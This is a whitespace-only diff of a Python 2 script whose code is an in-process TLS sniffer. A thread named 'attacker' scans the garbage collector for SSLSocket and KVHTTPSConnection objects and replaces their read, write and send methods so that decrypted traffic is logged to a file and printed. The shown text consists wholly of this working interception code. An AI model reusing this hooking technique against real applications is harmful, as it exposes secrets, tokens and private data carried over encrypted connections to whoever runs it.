@@ -32,35 +32,34 @@ def ssl_send(*args):
     f.write(str(data))
     f.flush()
     print data
-    return data    
-    
+    return data
+
 def sendx(*args):
     data = saved(*args)
     f.write(str(*args))
     f.flush()
     print data
-    return data   
-    
+    return data
+
 def getresponse(*args):
     data = getresponse_saved(*args)
     c = copy.deepcopy(data)
-    f.write(str(c.read()))    
+    f.write(str(c.read()))
     f.flush()
     print data
-    return data    
-    
-    
+    return data
+
 def attacker():
     global ssl_read_saved
     global ssl_write_saved
     global ssl_send_saved
-    global getresponse_saved 
+    global getresponse_saved
     global saved
     while True:
         objs = gc.get_objects()
         for obj in objs:
             if isinstance(obj, SSLSocket) and not hasattr(obj, "marked"):
-                print "S"                
+                print "S"
                 f.flush()
                 obj.marked = True
                 ssl_read_saved = obj.read
@@ -68,19 +67,16 @@ def attacker():
                 ssl_send_saved = obj.send
                 obj.read = ssl_read
                 obj.write = ssl_write
-                obj.send = ssl_send      
+                obj.send = ssl_send
             if isinstance(obj, KVHTTPSConnection) and not hasattr(obj, "marked"):
                 obj.marked = True
                 saved = obj.send
                 getresponse_saved  = obj.getresponse
                 obj.send = sendx
-                #obj.getresponse = getresponse                
+                #obj.getresponse = getresponse
                 f.flush()
-                
+
         time.sleep(1)
 
 t = threading.Thread(target=attacker)
 t.start()
-
-
-
